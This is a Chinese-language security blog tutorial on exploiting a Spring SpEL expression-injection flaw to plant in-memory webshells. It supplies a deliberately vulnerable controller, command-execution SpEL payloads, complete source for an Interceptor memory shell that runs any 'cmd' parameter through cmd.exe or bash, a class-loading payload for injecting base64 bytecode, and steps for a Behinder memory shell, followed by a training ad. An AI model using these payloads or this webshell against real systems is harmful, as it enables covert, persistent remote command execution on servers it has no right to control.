#  SpEL表达式漏洞注入内存马   
原创 暗月大徒弟  moonsec   2025-04-14 04:22  
  
### 1.实验环境  
  
jdk8 202  
  
springboot  1.3.0.RELEASE  
### 2.漏洞代码  
```
package code.landgrey.controller;

import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;

@RestController
public class TestController {
    @RequestMapping("/memshell")
    public String index(String name) throws IOException {
        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();
        Expression expression = spelExpressionParser.parseExpression(name);
        String out = (String) expression.getValue();
        System.out.println(out);
        return out;
    }
}

```  
### 创建 spelExpressionParser 对象 调用 parseExpression方法 解释表达式 expression.getValue() 获取执行的值转为字符串输出。  
### 3.表达式测试  
  
输入字符串  返回字符串  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5Ficu1Cr75FSFB4fTSf24g8S73srwibQXGdWX4AWGSY0A9H9OFHPK7LMg/640?wx_fmt=jpeg&from=appmsg "")  
  
T(Type)”来表示java.lang.Class类的实例，即如同java代码中直接写类名。  
```
T(java.lang.Runtime).getRuntime().exec("calc")
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5Ys5NtEnBVibL6qNJMs5OQaup4icWWxNaKBtibANZAcB09BibzOjog6UkxQ/640?wx_fmt=jpeg&from=appmsg "")  
  
也可以使用new class  创建实例  
```
new ProcessBuilder("cmd","/c","calc").start()
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5CoV6prNjmKYhwGFDfDJkaNwOFEVYQv6CTXgoPgWp289hMXLSia58BUw/640?wx_fmt=jpeg&from=appmsg "")  
  
回显  
```
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5XHIyVb9q3cqMeXeEHprDXOTdZHsLt0oQxzIrmTRC9Ng8ozvlngKjRw/640?wx_fmt=jpeg&from=appmsg "")  
### 4.注入内存马  
  
创建 Interceptor 内存马  
```
import org.springframework.web.servlet.HandlerInterceptor;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.List;

public class InceptorMemShell extends AbstractTranslet implements HandlerInterceptor {

    static {
        System.out.println("staart");
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        List<HandlerInterceptor> adaptInterceptors = null;
        try {
            adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        InceptorMemShell evilInterceptor = new InceptorMemShell();
        adaptInterceptors.add(evilInterceptor);
        System.out.println("ok");
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                response.setCharacterEncoding("gbk");
                java.io.PrintWriter printWriter = response.getWriter();
                ProcessBuilder builder;
                String o = "";
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                }
                java.util.Scanner c = new java.util.Scanner(builder.start().getInputStream(),"gbk").useDelimiter("wocaosinidema");
                o = c.hasNext() ? c.next(): o;
                c.close();
                printWriter.println(o);
                printWriter.flush();
                printWriter.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```  
  
   
  
利用 springboot的org.springframework.cglib.core.ReflectUtils加载类执行。   
  
传入类名 字节码 和 加载器  
```
  public static Class defineClass(String className, byte[] b, ClassLoader loader) throws Exception {
        return defineClass(className, b, loader, PROTECTION_DOMAIN);
    }

    public static Class defineClass(String className, byte[] b, ClassLoader loader, ProtectionDomain protectionDomain) throws Exception {
        Object[] args = new Object[]{className, b, new Integer(0), new Integer(b.length), protectionDomain};
        Class c = (Class)DEFINE_CLASS.invoke(loader, args);
        Class.forName(className, true, loader);
        return c;
    }
```  
  
  
payload   
```
T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.util.Base64Utils).decodeFromString(''),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()
```  
  
  
将内存马转为base64  不换行  
```
cat InceptorMemShell.class | base64 -w0
```  
  
接着转码提交即可注入内存马  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5pQ4sXyuTicibUILjicjAL0c8eddR1n7tiaicD5HZ0VMtPEibGlpPqFMoboaQ/640?wx_fmt=jpeg&from=appmsg "")  
  
执行弹出计算器命令  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5CBANaUWRnOcib03oVAGIveicdPWcCKrs2lq69QiaDNH5DGJzkowq9y0UQ/640?wx_fmt=jpeg&from=appmsg "")  
### 5.注入Behinder内存马  
  
运行jmg选择Behinder内存马 SpEl 这些配置打上。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg59W1gzgjXZ7iagEju5w5HGST7qK1ZfTRfiaccf9KNlhbK8icEFpuXJJDrw/640?wx_fmt=jpeg&from=appmsg "")  
  
自带利用加载payload 把#(和最后的)去掉 因为这里不需要占位符  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5wl1CQZySibZcWPSG3PDEkia4DW5o43kpaQfSBtOYPk9WmWaHCEGff8Mg/640?wx_fmt=jpeg&from=appmsg "")  
  
url转码提交 Behinder填写配置信息即可连接  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5InmZOiaicYBmImzH9icMRglSiaHWpPqCeBbkZ0NXXuQ0Q5HibHZLLPTuMLg/640?wx_fmt=jpeg&from=appmsg "")  
  
想系统学习渗透测试？扫码报名培训课程！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHEicNiaQaPJav7obHKZAxg5BDxoEY94MarKCnoEbSkpQbBXSgVfrKeDp5zNcug8RsAibrlgQrWl9qA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
